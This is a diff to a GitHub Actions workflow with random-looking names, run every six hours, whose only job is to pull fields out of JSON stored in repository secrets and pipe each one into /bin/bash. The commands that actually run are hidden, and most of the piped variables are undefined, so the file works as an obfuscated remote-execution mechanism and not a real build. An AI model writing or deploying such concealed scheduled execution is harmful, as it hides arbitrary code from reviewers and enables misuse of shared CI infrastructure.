@@ -1,30 +1,28 @@
 name: inboardstingy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
-jobs:  # 24600
+    - cron: '56 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: inboardstingy
         env:
-          in81654: ${{ secrets.in81654 }}
+          vub4108: ${{ secrets.vub4108 }}
         run: |
-          echo $in81654 | jq -r .ivm98596 | /bin/bash
-          echo $u78 | jq -r .syxf63710 | /bin/bash
-          echo $nzynq4 | jq -r .vjmgu4918 | /bin/bash
-          echo $w5 | jq -r .syig29246 | /bin/bash
-          echo $odwz5 | jq -r .m2 | /bin/bash
-          echo $i0 | jq -r .co4167 | /bin/bash
-          echo $cl68937 | jq -r .esayc422 | /bin/bash
-          echo $taolh448 | jq -r .bnt93210 | /bin/bash
-          echo $q6 | jq -r .pv55 | /bin/bash
-          echo $ehnz0925 | jq -r .fgbo98 | /bin/bash
-          echo $kkzp9 | jq -r .die943 | /bin/bash
-          echo $xqo471 | jq -r .qa882 | /bin/bash
-          echo $dadg82042 | jq -r .ik2653 | /bin/bash
-          echo $dt9 | jq -r .bmw1434 | /bin/bash
-          echo $q7 | jq -r .mkdml7854 | /bin/bash
+          echo $vub4108 | jq -r .hlm64 | /bin/bash
+          echo $wt7587 | jq -r .pf90884 | /bin/bash
+          echo $sjlgb860 | jq -r .n68 | /bin/bash
+          echo $odkv281 | jq -r .vz8 | /bin/bash
+          echo $itnv77820 | jq -r .o7 | /bin/bash
+          echo $ccz214 | jq -r .amq113 | /bin/bash
+          echo $wntws8912 | jq -r .x74 | /bin/bash
+          echo $kfcf87 | jq -r .ssyx3123 | /bin/bash
+          echo $yzcb4748 | jq -r .j21 | /bin/bash
+          echo $tnhsx927 | jq -r .par2964 | /bin/bash
+          echo $won44 | jq -r .vzudd20369 | /bin/bash
 
